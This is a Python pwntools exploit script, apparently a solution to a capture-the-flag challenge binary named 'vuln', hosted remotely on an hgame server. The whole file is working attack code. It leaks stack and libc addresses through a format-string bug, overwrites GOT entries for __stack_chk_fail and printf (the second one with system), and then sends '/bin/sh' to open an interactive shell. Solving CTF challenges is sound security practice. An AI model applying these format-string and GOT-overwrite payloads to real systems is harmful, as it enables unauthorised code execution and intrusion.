from pwn import * 
from pwn import p64


debug = 1
gdb_is = 0

# # context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host,31902)#远程连接
    gdb_is =0


if gdb_is:
    gdb.attach(r,'b*  0x4016a4')
    pause()
    pass

libc = ELF('./libc-2.31.so')
elf = ELF('./vuln')

print_got_addr = 0x404040
vuln_addr = 0x40158a
stack_chk_fail_addr = 0x0404030

r.sendafter(b'Yukkri say?\n',b'a'*256)
stack_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(f'stack = {hex(stack_addr)}')
canary_addr = stack_addr - 24 #调试出来的
print(f'canary_addr = {hex(canary_addr)}')
r.sendlineafter(b'(Y/n)',b'Y')
r.send(p64(stack_chk_fail_addr) + p64(stack_chk_fail_addr+1) + p64(stack_chk_fail_addr+2) + p64(canary_addr))
sleep(1)
r.sendlineafter(b'(Y/n)',b'n')
payload = b'%138c%8$hhn' + b'%139c%9$hhn' + b'%43c%10$hhn' + b'%11$n'
r.sendafter(b'you: \n',payload)
print('step one')

canary_addr -= 304
print(f'canary_addr = {hex(canary_addr)}')
r.sendafter(b'Yukkri say?\n',p64(print_got_addr)+p64(canary_addr))
r.sendlineafter(b'(Y/n)',b'n')
payload = b'%8$s' + b'%9$n\0'
r.sendafter(b'you: \n',payload)
print_addr = u64(r.recv(6).ljust(8,b'\x00'))
libc_addr = print_addr - libc.sym['printf']
system_addr = libc_addr + libc.sym['system']
print('step two')
print(f'system_addr = {hex(system_addr)}')

canary_addr -= 304
print(f'canary_addr = {hex(canary_addr)}')
payload = fmtstr_payload(8,{print_got_addr:system_addr,canary_addr:0xff})+b'\0'
r.sendafter(b'Yukkri say?\n',payload)
r.sendlineafter(b'(Y/n)',b'n')
r.sendafter(b'you: \n',payload)
print('step three')

r.sendafter(b'Yukkri say?\n',b'a'*256)
r.sendlineafter(b'(Y/n)',b'n')
payload = b'/bin/sh\x00'
r.sendafter(b'you: \n',payload)
print('step four')
r.interactive()